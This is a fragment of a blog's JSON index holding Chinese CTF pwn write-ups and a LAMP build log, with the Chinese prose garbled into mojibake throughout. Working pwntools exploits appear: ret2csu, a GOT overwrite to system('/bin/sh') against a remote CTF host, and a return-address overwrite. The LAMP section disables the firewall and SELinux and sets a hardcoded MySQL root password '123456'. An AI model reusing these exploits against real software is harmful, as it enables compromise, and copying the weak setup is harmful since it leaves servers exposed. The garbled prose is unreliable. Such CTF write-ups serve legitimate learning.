è¿™ä¸ªé¢˜ç›®åœ¨callå®Œæ¯ä¸€ä¸ªå‡½æ•°è‡ªå¸¦çš„æ­£å¸¸åº“å‡½æ•°åï¼Œéƒ½å°†å…¶gotè¡¨æ¸…0ã€‚ä½†æ˜¯ä¼šå‘ç°ä¸Šé¢è¿˜æœ‰ä¸€ä¸ªåŠ¨æ€é“¾æ¥_DYNAMICçš„ä¿¡æ¯ï¼Œè·Ÿè¿›å»ï¼šå‘ç°ä¸€å †åˆå§‹åŒ–ç”¨çš„å‡½æ•°ã€‚ç„¶åç‚¹è¿›å»ç¬¬ä¸€ä¸ªå¯ä»¥çœ‹çœ‹ï¼šå‘ç°è¿™é‡Œä¹Ÿæ²¡æœ‰å¯¹rdxè¿›è¡Œå¤„ç†ï¼Œå¯ä»¥ä½¿ç”¨è¿™ä¸ªã€‚ç°åœ¨å°±æ˜¯ç¡®å®šä¸€ä¸‹å“ªé‡Œå­˜æ”¾ç€0x400560ï¼Œæ¯«æ— ç–‘é—®è‚¯å®šæ˜¯è¿™ä¸ª_DYNAMICé‡Œï¼Œä½†æ˜¯è‡ªå·±ç›®å‰è¿˜ä¸ç†Ÿæ‚‰è¿™ä¸ªç»“æ„ï¼Œçœ‹èµ·æ¥è²Œä¼¼æ˜¯ä¸ªç»“æ„ä½“ã€‚å…ˆgdbè·Ÿå…¥æŸ¥çœ‹å§ï¼šå‘ç°åº”è¯¥æ˜¯0x0600E38ã€‚æ¥ä¸‹æ¥çš„å°±ç®€å•äº†ï¼Œä¼ ç»Ÿçš„ret2csuã€‚ expfrom pwn import * context.arch = 'amd64' context.log_level = 'debug' io = process('./ret2csu') elf = ELF('./ret2csu') offset = 40 io.recvuntil('&gt;') key1 = 0x040089A key2 = 0x000400880 key3 = 0x0000600E38 raw_input('-&gt;') payload = offset * 'a' + flat([key1,0,1,key3,0,0,0xdeadcafebabebeef,key2,7*8*'a',0x000004007B1]) io.sendline(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"wp","slug":"wp","permalink":"http://chumen77.xyz/tags/wp/"}]},{"title":"linux- Lampæ­å»ºè®°å½•","slug":"linux_ Lampæ­å»ºè®°å½•","date":"2020-04-08T06:24:44.064Z","updated":"2020-04-15T14:16:28.952Z","comments":true,"path":"2020/04/08/linux_ Lampæ­å»ºè®°å½•/","link":"","permalink":"http://chumen77.xyz/2020/04/08/linux_ Lampæ­å»ºè®°å½•/","excerpt":"","text":"Lampæ­å»ºè®°å½•å‡†å¤‡å·¥ä½œå®‰è£…ç¼–è¯‘ç¯å¢ƒï¼šyum -y install gcc* å®‰è£…å¥½åè®°å¾—å…³é—­é˜²ç«å¢™å’Œselinux å‡†å¤‡è½¯ä»¶åŒ…æŠŠè¿™äº›å®‰è£…åŒ…éƒ½æ”¾å…¥è™šæ‹Ÿæœºè‡ªå®šä¹‰çš„è·¯å¾„ï¼Œç­‰å¾…ä½¿ç”¨ã€‚ shellè„šæœ¬æ‰¹é‡è§£åŒ…#!/bin/bash /bin/ls *tar.gz &gt; ls.list /bin/ls *tgz &gt;&gt; ls.list for a in `cat ls.list` do /bin/tar -zxf $a done rm -rf ls.list ç„¶åå¼€å§‹ä¸€ä¸€çš„è£…åŒ…ï¼Œæ³¨æ„éœ€è¦æŒ‰ç…§ä¸€å®šçš„é¡ºåºæ¥è£…çš„ã€‚ python-develyum -y install python-devel å®‰è£…pythonçš„åº•å±‚ç¯å¢ƒã€‚ [root@localhost lamp1]# cd libxml2-2.9.1/ [root@localhost libxml2-2.9.1]# ./configure --prefix=/usr/local/libxml2/ [root@localhost libxml2-2.9.1]# make [root@localhost libxml2-2.9.1]# make install libmcryptæä¾›ä¸€äº›åŠ å¯†ç®—æ³•ï¼š [root@localhost lamp1]# cd libmcrypt-2.5.8/ [root@localhost libmcrypt-2.5.8]# ./configure --prefix=/usr/local/libmcrypt/ [root@localhost libmcrypt-2.5.8]# make [root@localhost libmcrypt-2.5.8]# make install libltdl[root@localhost lamp1]# cd libmcrypt-2.5.8/libltdl/ [root@localhost libltdl]# ./configure --enable-ltdl-install [root@localhost libltdl]# make [root@localhost libltdl]# make install mhashæä¾›åŠ å¯†æ–¹å¼çš„æ‰©å±• [root@localhost lamp1]# cd mhash-0.9.9.9/ [root@localhost mhash-0.9.9.9]# ./configure mcryptæä¾›phpç›¸å…³çš„åŠ å¯†æ”¯æŒæ‹“å±•åº“ [root@localhost mcrypt-2.6.8]# LD_LIBRARY_PATH=/usr/local/libmcrypt/lib:/usr/local/lib \\./configure --with-libmcrypt-prefix=/usr/local/libmcrypt [root@localhost mcrypt-2.6.8]# make [root@localhost mcrypt-2.6.8]# make install zlibæä¾›å‹ç¼©ç”¨é€”çš„å‡½æ•°åº“ [roott@localhost lamp1]# cd zlib-1.2.3/ [root@localhost zlib-1.2.3]# ./configure [root@localhost zlib-1.2.3]# make [root@localhost zlib-1.2.3]# make install libpng[root@localhost zlib-1.2.3]# cd ../ [root@localhost lamp1]# cd libpng-1.2.31/ [root@localhost libpng-1.2.31]# ./configure --prefix=/usr/local/libpng [root@localhost libpng-1.2.31]# make [root@localhost libpng-1.2.31]# make install å¦‚æœå‡ºç°ï¼š /usr/bin/ld: //usr/local/lib/libz.a(crc32.o): relocation R_X86_64_32 against `.rodata' can not be used when making a shared object; recompile with -fPIC è§£å†³åŠæ³• ï¼š [root@localhost lamp1]# cd zlib-1.2.3 //è¿›å…¥zlibç›®å½• [root@localhost zlib-1.2.3]# ./configure [root@localhost zlib-1.2.3]# CFLAGS=\"-O3 -fPIC\" ./configure --prefix=/usr/local/zlib/ #ä½¿ç”¨64ä½å…ƒçš„æ–¹æ³•è¿›è¡Œç¼–è¯‘ [root@localhost zlib-1.2.3]# make [root@localhost zlib-1.2.3]# make install [root@localhost zlib-1.2.3]# make clean ç„¶ååœ¨é‡æ–°æ¥å®‰è£…libpngå³å¯ã€‚ jpeg6æä¾›jpegæ ¼å¼çš„å›¾ç‰‡ [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6 [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/bin [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/lib [root@localhost libpng-1.2.31]# mkdir /usr/local/jpeg6/include [root@localhost libpng-1.2.31]# mkdir -p /usr/local/jpeg6/man/man1 root@localhost lamp]# cd jpeg-6b/ [root@localhost jpeg-6b]# ./configure --prefix=/usr/local/jpeg6/ --enable-shared --enable-static å¦‚æœå‘ç”Ÿè¿™æ ·çš„æŠ¥é”™ï¼š [root@localhost jpeg-6b]# make ./libtool --mode=compile gcc -O2 -I. -c ./jcapimin.c make: ./libtoolï¼šå‘½ä»¤æœªæ‰¾åˆ° make: *** [jcapimin.lo] é”™è¯¯ 127 éœ€è¦ï¼š [root@localhost jpeg-6b]# yum -y install libtool [root@localhost jpeg-6b]# cp /usr/share/libtool/config/config.guess . cpï¼šæ˜¯å¦è¦†ç›–\"./config.guess\"ï¼Ÿ yes [root@localhost jpeg-6b]# make clean é‡æ–°å†æ¥å°±å¥½ã€‚ freetypeå­—ä½“åº“ã€‚ [root@localhost freetype-2.3.5]# ./configure --prefix=/usr/local/freetype GDç»™phpæä¾›å›¾å½¢æ‹“å±•çš„åº“ [root@localhost lamp]# mkdir /usr/local/gd2 [root@localhost lamp]# cd /usr/src/lamp/gd-2.0.35/ [root@localhost gd-2.0.35]# ./configure --prefix=/usr/local/gd2/ --with-jpeg=/usr/local/jpeg6/ --with-freetype=/usr/local/freetype/ --with-png=/usr/local/libpng/ è¿™æ ·ä¼šçˆ†ä¸€ä¸ªé”™ï¼Œç„¶åéœ€è¦æ”¹ä¸€ä¸‹æºç ï¼š [root@localhost gd-2.0.35]# vim gd_png.c éœ€è¦æŒ‡å®šä¸€ä¸‹è·¯å¾„å³å¯ï¼Œè¿™ä¸ªåˆšåˆšæ˜¯å·²ç»å®‰è£…è¿‡çš„ã€‚ httpedå…ˆè£…ä¸¤ä¸ªå·¥å…·åŒ…ï¼š cp -r apr-1.4.6 httpd-2.4.7/srclib/apr cp -r apr-util-1.4.1 httpd-2.4.7/srclib/apr-util å¼€å§‹è£…httpedï¼šå…ˆè¿›å…¥è£…ä¸€ä¸‹pcreï¼š ./configure make make install è¿›å…¥httpedï¼šå…ˆå¯¹é…ç½®è¿›è¡Œè®¾ç½®ï¼š ./configure --prefix=/usr/local/apache2/ --sysconfdir=/usr/local/apache2/etc --with-include-apr --enable-so --enable-deflate=shared --enable-expires=shared --enable-rewrite=shared make make install å¼€æœåŠ¡ï¼š/usr/local/apache2/bin/apachectl start è‡ªå¯åŠ¨[root@localhost httpd-2.4.7]# vim /etc/rc.d/rc.local è®¾ç½®å¼€æœºæ—¶è‡ªåŠ¨å¯åŠ¨è¿™ä¸ªæœåŠ¡ã€‚ mysqlå‡†å¤‡å·¥ä½œè£…ä¸¤ä¸ªå·¥å…·ï¼š [root@localhost local]# yum -y install cmake [root@localhost local]# yum -y install bison [root@localhost local]# yum -y install ncurses-devel å»ºç«‹ä¸€ä¸ªç”¨æˆ·ï¼š [root@localhost local]# useradd mysql [root@localhost local]# id mysql uid=1001(mysql) gid=1001(mysql) ç»„=1001(mysql) å®‰è£…ncursesï¼š [root@localhost ncurses-5.9]# ./configure --with-shared --without-debug --with-ada --enable-overwrite [root@localhost ncurses-5.9]# make [root@localhost ncurses-5.9]# make install å¼€å§‹å®‰è£… [root@localhost mysql-5.5.23]# cmake -DCMAKE_INSTALL_PREFIX=/usr/local/mysql \\ &gt; -DMYSQL_UNIX_ADDR=/tmp/mysql.sock -DEXTRA_CHARSET=all -DDEFAULT_CHARSET=utf8 \\ &gt; -DDEFAULT_COLLATION=utf8_general_ci -DWITH_MYISAM_STORAGE_ENGINE=1 \\ &gt; -DWITH_INNOBASE_STORAGE_ENGINE=1 -DWITH_MEMORY_STORAGE_ENGINE=1 \\ &gt; -DWITH_READLINE=1 -DENABLED_LOCAL_INFILE=1 -DMYSQL_USER=mysql \\ &gt; -DMYSQL_TCP_PORT=3306 [root@localhost mysql-5.5.23]# make [root@localhost mysql-5.5.23]# make install ç®€å•è®¾ç½®åˆå§‹åŒ–mysqlï¼š [root@localhost mysql]# chown -R mysql:mysql . [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql è®¾ç½®æƒé™ï¼š [root@localhost mysql]# chown -R root . [root@localhost mysql]# chown -R mysql data/ è¦†ç›–ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼š [root@localhost mysql]# cp support-files/my-medium.cnf /etc/my.cnf cpï¼šæ˜¯å¦è¦†ç›–\"/etc/my.cnf\"ï¼Ÿ yes æ¥ç€åˆå§‹åŒ–ï¼š [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql 200408 03:38:45 mysqld_safe Logging to '/usr/local/mysql/data/localhost.localdomain.err'. 200408 03:38:45 mysqld_safe Starting mysqld daemon with databases from /usr/local/mysql/data 200408 03:38:47 mysqld_safe mysqld from pid file /usr/local/mysql/data/localhost.localdomain.pid ended [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql å‘ç°å¡æ­»äº†ï¼š [root@localhost mysql-5.5.23]# ps aux | grep mysql [root@localhost mysql-5.5.23]# kill -9 102872 [root@localhost mysql-5.5.23]# ps aux | grep mysql mysql 103111 0.0 4.9 727288 49260 pts/3 Sl 03:39 0:00 /usr/local/mysql/bin/mysqld --basedir=/usr/local/mysql --datadir=/usr/local/mysql/data --plugin-dir=/usr/local/mysql/lib/plugin --user=mysql --log-error=/usr/local/mysql/data/localhost.localdomain.err --pid-file=/usr/local/mysql/data/localhost.localdomain.pid --socket=/tmp/mysql.sock --port=3306 root 103201 0.0 0.0 112728 972 pts/2 S+ 03:46 0:00 grep --color=auto mysql æ€æ‰é‡æ–°æ¥ã€‚ [root@localhost mysql]# /usr/local/mysql/scripts/mysql_install_db --user=mysql [root@localhost mysql]# /usr/local/mysql/bin/mysqld_safe --user=mysql æˆåŠŸäº†ã€‚ è‡ªå¯åŠ¨[root@localhost mysql-5.5.23]# vim /etc/rc.d/rc.local è®¾ç½®mysqlå¯†ç [root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysqladmin -u root password \"123456\" [root@localhost mysql-5.5.23]# /usr/local/mysql/bin/mysql -u root -p æˆåŠŸäº†ã€‚æ³¨æ„ history -c æ¸…æ¥šå†å²è®°å½•å‘½ä»¤ã€‚æœåŠ¡éƒ½æ­£å¸¸ï¼Œå­—ç¬¦é›†æ ¼å¼ä¹Ÿåœ¨ã€‚ phpå‡†å¤‡å·¥ä½œ[root@localhost mysql]# yum -y install libtool* [root@localhost local]# yum -y install libpng-devel è®©phpæ”¯æŒæ•°æ®åº“çš„å†…å®¹ï¼š [root@localhost mysql]# vim /usr/local/gd2/include/gd_io.h å¼€å§‹å®‰è£…[root@localhost php-5.4.25]# ./configure --prefix=/usr/local/php/ --with-config-file-path=/usr/local/php/etc/ --with-apxs2=/usr/local/apache2/bin/apxs --with-mysql=/usr/local/mysql --with-libxml-dir=/usr/local/libxml2 --with-jpeg-dir=/usr/local/jpeg6/ --with-png-dir=/usr/local/libpng/ --with-freetype-dir=/usr/local/freetype/ --with-gd=/usr/local/gd2/ --with-mcrypt=/usr/local/libmcrypt/ --with-mysqli=/usr/local/mysql/bin/mysql_config --enable-soap --enable-mbstring=all --enable-sockets --with-pdo-mysql=/usr/local/mysql --without-pear [root@localhost php-5.4.25]# make [root@localhost php-5.4.25]# make install é…ç½®[root@localhost php-5.4.25]# mkdir /usr/local/php/etc [root@localhost php-5.4.25]# cp php.ini-production /usr/local/php/etc/php.ini å¤åˆ¶ä¸»é…ç½®æ–‡ä»¶åˆ°/usr/local/php/etc [root@localhost php-5.4.25]# vi /usr/local/apache2/etc/httpd.conf ä¿®æ”¹apache2é…ç½®ï¼Œè®©å…¶ä¹Ÿå¯ä»¥æ”¯æŒphp é‡å¯apache2: [root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl stop AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using localhost.localdomain. Set the 'ServerName' directive globally to suppress this message [root@localhost php-5.4.25]# /usr/local/apache2/bin/apachectl start AH00558: httpd: Could not reliably determine the server's fully qualified domain name, using localhost.localdomain. Set the 'ServerName' directive globally to suppress this message restart å¯èƒ½æ˜¯æ— æ•ˆçš„ã€‚ éªŒè¯apacheä¸php [root@localhost htdocs]# vi index.php å†™ä¸€ä¸ªphpæ¢é’ˆï¼š &lt;?php phpinfo(); ?&gt; apacheä¸MySQL&lt;?php $link=mysql_connect('localhost','root','123456'); if($link) echo \"Congratulations!!!!!!\"; mysql_close(); ?&gt; phpadminæ­å»º[root@localhost lamp1]# cp -r phpMyAdmin-4.1.4-all-languages /usr/local/apache2/htdocs/phpmyadmin é…ç½®æ–‡ä»¶[root@localhost phpmyadmin]# cp config.sample.inc.php config.inc.php [root@localhost phpmyadmin]# vi config.inc.php è®¿é—®æµ‹è¯•ï¼š","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://chumen77.xyz/tags/linux/"}]},{"title":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰","date":"2020-04-03T08:59:50.107Z","updated":"2020-10-06T05:34:27.572Z","comments":true,"path":"2020/04/03/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰/","link":"","permalink":"http://chumen77.xyz/2020/04/03/æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰/","excerpt":"","text":"æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å°æ€»ç»“ï¼ˆä¸‹ï¼‰å‰è¨€æ¥ç€ä¸Šä¸€ç¯‡ï¼Œè¿™ä¸€ç¯‡ä¸»è¦è®°å½•ä¸€ä¸‹å¯¹äºè¿™ä¸ªæ¼æ´çš„åˆ©ç”¨å’Œctfèµ›é¢˜ä¸­å¸¸è§çš„å¥—è·¯å’Œè€ƒæ³•ã€‚ æ ¼å¼åŒ–å­—ç¬¦ä¸²åœ¨æ ˆä¸ŠåŠ«æŒgot æ¯æ¬¡ call libc ä¸­çš„å‡½æ•°æ—¶éƒ½ä¼šå»GOTè¡¨ä¸­æŸ¥è¯¢æ¥æ‰¾å‡ºç¨‹åºä¸‹ä¸€æ­¥è¦jmpçš„ä½å€ å¯ä»¥é€šè¿‡ fmt æ„é€ å†™å…¥ä¸€ä¸ªç›®æ ‡åœ°å€ï¼Œæ”¹æ‰ GOT è¡¨ä¸Šçš„åœ°å€ä½¿å¾—callè¯¥å‡½æ•°æ—¶å˜æˆjmpåˆ°æˆ‘ä»¬è¦çš„ç›®æ ‡åœ°å€å»ä¾‹å¦‚ ï¼šå°† printf æ”¹æˆ systemï¼ŒåŸæœ¬ printf (â€œshâ€™â€™ï¼‰å°±ç›´æ¥å˜æˆ system (â€œshâ€),ä¾¿å¯ä»¥æ‹¿åˆ°shellã€‚ï¿¼è¿™ä¸€æ”»å‡»è¿‡ç¨‹å¯ä»¥åˆ†ä¸ºä»¥ä¸‹å‡ ä¸ªæ­¥éª¤ï¼š ç¡®å®šä¸€ä¸‹printfå‡½æ•°çš„GOTè¡¨çš„åœ°å€ï¼Œå¦‚å›¾ä¸­æ˜¯0x804a010 ç¡®å®šä¸€ä¸‹systemå‡½æ•°çš„å†…å­˜åœ°å€æˆ–è€…pltï¼ˆé€šå¸¸éƒ½éœ€è¦æ³„æ¼ä¸€ä¸‹libcçš„åŸºåœ°å€ï¼Œç„¶ååŠ ä¸Šåç§»ç®—å‡ºï¼Œå½“ç„¶ä¹Ÿä¼šé‡åˆ°ç¨‹åºç›´æ¥å­˜åœ¨systemå‡½æ•°ï¼Œé‚£ä¹ˆå°±æ˜¯pltï¼‰ åœ¨æ ˆä¸Šæ„é€ å‡ºprintfå‡½æ•°GOTè¡¨çš„åœ°å€ åˆ©ç”¨fmtæ¼æ´ä¿®æ”¹printfå‡½æ•°GOTè¡¨ä¸Šçš„åœ°å€ ç„¶åçœ‹ä¸€ä¸ªä¾‹é¢˜ï¼š inndy-echoä¿æŠ¤å’ŒarchArch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) idaåˆ†æint __cdecl __noreturn main(int argc, const char **argv, const char **envp) &#123; char s; // [esp+Ch] [ebp-10Ch] unsigned int v4; // [esp+10Ch] [ebp-Ch] v4 = __readgsdword(0x14u); setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); do &#123; fgets(&amp;s, 256, stdin); printf(&amp;s); &#125; while ( strcmp(&amp;s, \"exit\\n\") ); system(\"echo Goodbye\"); exit(0); &#125; å¯ä»¥çœ‹åˆ°ä¼šæ— é™çš„æ‰“å°ä½ è¾“å…¥çš„ä¸œè¥¿ï¼Œé‚£å°±æ„å‘³ç€å¯ä»¥æ— é™æ¬¡è§¦å‘è¿™ä¸ªæ¼æ´ã€‚å¹¶ä¸”è¿˜æœ‰systemè¿™ä¸ªå‡½æ•°ï¼Œé‚£å¯ä»¥ç›´æ¥æ‰¾å…¶pltã€‚ æ”»å‡»æ€è·¯ï¼š åœ¨æ ˆä¸Šæ”¾å¥½printfå‡½æ•°çš„GOTè¡¨åœ°å€ï¼Œå¹¶ç¡®å®šä¸€ä¸‹åç§» æ”¹è¿™ä¸ªGOTä¸Šçš„åœ°å€ä¸ºsystemå‡½æ•°çš„plt æ”¹å¥½ä¸€ä¼šï¼Œä¼ é€ä¸€ä¸ª/bin/shï¼Œæ­¤æ—¶å°±ä¼šå˜æˆsystem(/bin/sh) åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­éœ€è¦æ³¨æ„ä¸€ä¸‹ï¼Œæ”¹GOTè¡¨ä¸Šçš„å€¼è¦å•æ¬¡printfå¤šæ¬¡å†™å…¥ï¼Œå¦åˆ™åªæ”¹ä¸€èˆ¬ç¨‹åºä¼šå‡ºç°æ— æ³•é¢„æ–™çš„æƒ…å†µã€‚è¿˜æœ‰å°±æ˜¯éœ€è¦æ³¨æ„ä¸€ä¸‹å­—èŠ‚å¯¹é½ã€‚ gdbè°ƒè¯•gdb-peda$ stack 0x20 0000| 0xffffd250 --&gt; 0xffffd26c (\"AAAA\\n\") 0004| 0xffffd254 --&gt; 0x100 0008| 0xffffd258 --&gt; 0xf7fb25a0 --&gt; 0xfbad208b 0012| 0xffffd25c --&gt; 0x0 0016| 0xffffd260 --&gt; 0xf7ffd000 --&gt; 0x23f40 0020| 0xffffd264 --&gt; 0x80482e7 (\"__libc_start_main\") 0024| 0xffffd268 --&gt; 0xf63d4e2e 0028| 0xffffd26c (\"AAAA\\n\") gdb-peda$ fmtarg 0xffffd26c The index of format argument : 7 (\"\\%6$p\") ç¡®å®šåç§»æ˜¯7ï¼Œä½†éœ€è¦æ³¨æ„å­—èŠ‚å¯¹é½ï¼Œæ‰“ç®—ä¸€ä¼šåœ¨å†™payloadæ—¶å€™ï¼Œå°±().ljustè¡¥æˆ0x20çš„aï¼Œä¹Ÿå°±æ˜¯offset = 7 + 0x20/4 = 15 expfrom pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 def fmt_short(prev,val,idx,byte = 2): result = \"\" if prev &lt; val : result += \"%\" + str(val - prev) + \"c\" elif prev == val : result += '' else : result += \"%\" + str(256**byte - prev + val) + \"c\" result += \"%\" + str(idx) + \"$hn\" return result prev = 0 payload = \"\" key = 0x08048400 for i in range(2): payload +=fmt_short(prev,(key &gt;&gt; 16*i) &amp; 0xffff,15+i) prev = (key &gt;&gt; i*16) &amp; 0xffff payload = payload.ljust(0x20,'a') + p32(printf_got) + p32(printf_got+2) raw_input('-&gt;') io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() æ¢ä¸€ç§å°±æ˜¯ç”¨pwntoolsä¸­é’ˆå¯¹æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´åˆ©ç”¨æ¨¡å—ä¸­çš„å‡½æ•°fmtstr_payloadï¼Œé¢å¯¹32ä½ï¼Œè¿™ç§æƒ…å†µè¿˜æ˜¯å¾ˆå¥½ç”¨çš„ï¼š from pwn import * context.log_level = 'debug' context.arch = 'i386' # io = process('./echo') io = remote('node3.buuoj.cn',26990) system_plt = 0x08048400 printf_got = 0x0804A010 payload = fmtstr_payload(7,&#123;printf_got : system_plt&#125;) io.sendline(payload) io.send('/bin/sh\\x00') io.interactive() å¯ä»¥çœ‹ä¸€ä¸‹å…¶ç”Ÿæˆçš„payloadï¼ŒæŠŠç›®æ ‡åœ°å€ä¿¡æ¯æ”¾åœ¨å¼€å¤´ï¼Œåœ¨64ä½æ˜¯è‚¯å®šæ˜¯ä¸å¯è¡Œçš„ã€‚ï¼ˆä¸è¿‡å¬è¯´pwntoolsçš„æ–°ç‰ˆæœ¬æ˜¯å·²ç»æ”¯æŒ64ä½äº†ï¼Œä½†æ˜¯æœ¬äººä¸€ç›´æ²¡æœ‰æ›´æ–°æˆåŠŸï¼Œæ‰€ä»¥ä¹Ÿæ²¡æœ‰æµ‹è¯•ï¼‰ åŠ«æŒretaddressé¡¾åæ€è®®ï¼Œå°±æ˜¯åˆ©ç”¨æ ¼å¼åŒ–ä¸²æ¼æ´æ¥ä¿®æ”¹å‡½æ•°çš„è¿”å›åœ°å€åˆ°æˆ‘ä»¬æƒ³è¦jmpçš„åœ°å€ã€‚å¸¸è§å¥—è·¯ï¼š jmpåˆ°å¸¦æœ‰system(/bin/sh) çš„åé—¨å‡½æ•° ä¸å¼€nxä¿æŠ¤ï¼Œjmpåˆ°è‡ªå·±æ„é€ çš„shellcodeä¸Šã€‚ æå‰æ³„æ¼libcç®—å‡ºlibcçš„baseï¼Œjmpåˆ°onegadgetåœ°å€ çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š ä¸‰ä¸ªç™½å¸½ - pwnme-k0ä¿æŠ¤å’ŒarchArch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) 64ä½ç¨‹åºï¼Œä¸”å¼€å¯äº†RELROä¿æŠ¤ï¼Œè¿™æ ·å°±æ— æ³•ä¿®æ”¹gotè¡¨äº†ã€‚ idaåˆ†æè¿™ä¸ªç¨‹åºå®ç°äº†ä¸€ä¸ªæ³¨å†Œç”¨æˆ·çš„åŠŸèƒ½ï¼Œæ³¨å†Œå¥½åå¯ä»¥æ¥å±•ç¤ºç”¨æˆ·ä¿¡æ¯ï¼Œä¿®æ”¹ç”¨æˆ·ä¿¡æ¯ï¼Œå’Œé€€å‡ºç¨‹åºã€‚å…¶ä¸­åœ¨å±•ç¤ºç”¨æˆ·ä¿¡æ¯å½“ä¸­ï¼Œå­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼š int __fastcall sub_400B07(char format, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, char formata, __int64 a8, __int64 a9) &#123; write(0, \"Welc0me to sangebaimao!\\n\", 0x1AuLL); printf(&amp;formata, \"Welc0me to sangebaimao!\\n\"); return printf(&amp;a9 + 4); &#125; å¹¶ä¸”å‘ç°å…¶ä¸­è¾“å‡ºçš„bufå°±æ˜¯ä½ è¾“å…¥çš„å¯†ç ï¼š è¿˜å‘ç°å…¶ä¸­æœ‰ä¸ªåé—¨å‡½æ•°ï¼š ä¼šè°ƒç”¨systemå‡½æ•°ç»™ä½ shellï¼Œé‚£æ”»å‡»æ€è·¯ä¹Ÿå°±æ˜¯å»ä¿®æ”¹ç¨‹åºä¸­æŸä¸ªå‡½æ•°çš„è¿”å›åœ°å€ï¼Œç›´æ¥è¿”å›åˆ°è¿™é‡Œå°±æ‹¿åˆ°shelläº†ã€‚ gdbè°ƒè¯•ï¼šå®šä½åˆ°è¿™ä¸ªå­˜åœ¨æ¼æ´çš„printfå½“ä¸­ï¼Œç¡®å®šä¸€ä¸‹ï¼šçœ‹ä¸€ä¸‹æ­¤æ—¶çš„æ ˆæƒ…å†µï¼Œè¾“å…¥çš„usenameå¯ä»¥ç¡®å®šåç§»æ˜¯8ï¼Œå¹¶ä¸”rdiä¹Ÿæ˜¯æŒ‡å‘äº†å­˜æ”¾passwordçš„åœ°å€ã€‚ ç„¶åå‘ç°æ ˆä¸Šä¹Ÿæœ‰å¾ˆå¤šæ ˆçš„åœ°å€ä¿¡æ¯ï¼Œå½“ç¨‹åºç¬¬äºŒæ¬¡è¿è¡Œåˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œå‘ç°è¿™é‡Œespå¯¹åº”çš„åœ°å€ä¿¡æ¯ä¹Ÿæ˜¯ä¸ä¼šå˜çš„ã€‚æ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ³„æ¼è¿™é‡Œçš„å€¼æ¥ç®—å‡ºå­˜æ”¾ret addressçš„æ ˆåœ°å€ã€‚ ç„¶åè®©ç¨‹åºè¿è¡Œåˆ°ä¿®æ”¹ç”¨æˆ·ä¿¡æ¯çš„å‡½æ•°ï¼Œè¿™ä¸‹æŠŠret addressçš„pointæ”¾åˆ°æ ˆä¸Šï¼Œæ¥ç€å°±å¯ä»¥å¼€å§‹ä¿®æ”¹ret addressçš„å€¼äº†ã€‚ expfrom pwn import * context.log_level = 'debug' context.arch = 'amd64' io = process('./pwnme_k0') # context.clear(arch = 'amd64') io.recvuntil('lenth:20): \\n') io.sendline('%0006$lx') io.recvuntil('lenth:20): \\n') io.sendline('11111111') io.recvuntil('&gt;') io.sendline('1') # io.recvuntil('Welc0me to sangebaimao!\\n') stack = int(io.recvline_contains('7f'),16) print(stack) ret_add = stack - 0x38 # system_add = 0x04008AA payload = '%2218c%8$hn' io.recvuntil('&gt;') io.sendline('2') io.recvuntil('lenth:20): \\n') io.sendline(p64(ret_add)) io.recvuntil('lenth:20): \\n') io.sendline(payload) io.recvuntil('&gt;') io.sendline('1') io.interactive() ä¿®æ”¹FINI_ARRAYåŒºåœ¨ä¸Šé¢çš„ä¸¤ä¸ªä¾‹å­ä¸­å¯ä»¥å‘ç°,ä¹‹æ‰€ä»¥èƒ½æˆåŠŸåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´getshell,å¾ˆå¤šæ—¶å€™éƒ½æ˜¯å› ä¸ºç¨‹åºä¸­å­˜åœ¨å¾ªç¯ï¼Œè®©æˆ‘ä»¬å¯ä»¥å¤šæ¬¡è§¦å‘æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ã€‚å¦‚æœç¨‹åºä¸­ä¸å­˜åœ¨å¾ªç¯å‘¢?åˆ©ç”¨ROPåŠ«æŒå‡½æ•°è¿”å›åœ°å€åˆ°startå¯ä»¥å®ç°ï¼›å½“å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ—¶ï¼Œä½¿ç”¨è¿™ä¸ªæ¼æ´ä¹Ÿåšåˆ°è¿™ä¸€ç‚¹ã€‚ ç®€å•åœ°è¯´,ä¸€ä¸ªç¨‹åºåœ¨è°ƒç”¨ mainå‡½æ•°å‰ä¼šè°ƒç”¨.initæ®µä»£ç å’Œ .init_array æ®µçš„å‡½æ•°æ•°ç»„ä¸­æ¯ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆã€‚åŒæ 